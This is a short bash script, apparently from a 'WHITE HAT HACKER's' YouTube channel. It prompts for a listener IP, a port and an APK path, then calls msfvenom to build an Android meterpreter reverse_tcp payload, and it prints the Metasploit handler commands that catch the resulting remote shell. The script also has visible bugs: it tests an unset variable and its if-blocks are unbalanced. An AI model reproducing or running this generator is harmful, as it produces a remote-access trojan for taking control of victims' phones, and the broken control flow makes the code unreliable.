#colors
c='\033[1;36m'
g='\033[1;32m'
r='\033[1;31m'
y='\033[1;33m'
b='\033[1;34m'
p='\033[1;35m'
re='\033[0m'


clear
sleep 4
figlet "W H HACKER's"| lolcat
echo
echo
sleep 2
echo ">>>>>>>>>>>>>>>>>>DEVOLOPED BY KMD ZIHAD<<<<<<<<<<<<<<<<<<<<<"| lolcat
echo""
echo""
echo""
echo""
echo ">>>>>>>>>>>>>>>>[YouTube: WHITE HAT HACKER's]<<<<<<<<<<<<<<<<"| lolcat
echo""
echo""
echo""
sleep 2
echo $g "[*] pleace enter your IP ADDRESS or LHOST EX: 127.0.0.1"
echo""
echo "W H HACKERS~~~~~~~~~~>"| lolcat
echo""
read -p "# LHOST: "    i
clear
echo $g "[*] Pleace enter your LPORT EX: 4444 / 443 "
echo""
echo "W H HACKERS~~~~~~~~~~>"| lolcat
echo""
read -p "# LPORT: "    t
clear
echo $g " [*] Pleace enter your PATH EX:   /sdcard/mainactyvity.apk"
echo""
echo "W H HACKERS~~~~~~~~~~>"| lolcat
echo""
read -p "[#] PATH: "     f
clear
sleep 2
echo "Pleace chake your informations"| lolcat
echo ""
sleep 2
echo "LHOST: $i"| lolcat
echo""
sleep 2
echo "LPORT: $t"|  lolcat
echo""
sleep 2
echo "PATH:  $f"| lolcat
echo""
sleep 2
echo "IN YOUR INFORMATIONS ARE RIGHT" | lolcat
echo ""
clear
sleep 2
echo "GANARATING PAYLOAD......................"| lolcat
echo""

msfvenom -p android/meterpreter/reverse_tcp lhost=$i lport=$t -o $f

echo $green "payload ganaret seccessfully........ "
echo $p "If you create listener {"$g"Y"$p"/"$r"n"$p"}"
echo$g"  "
read -p "root-kmd:#~"

if [ $pil = n ]
then
clear
echo $g "Have a good day"
cd home

if [ $pil = y ]
then
clear
echo $ g"copy this text and past to open matasploit"
echo 
echo 
echo $y "			use exploit/multi/handler"
echo $y "			set payload android/meterpreter/reverse_tcp"
echo $y "			set lhost $i"
echo $y "			set lport $t"
echo $y "			exploit"
sleep 10
msfconsole
fi

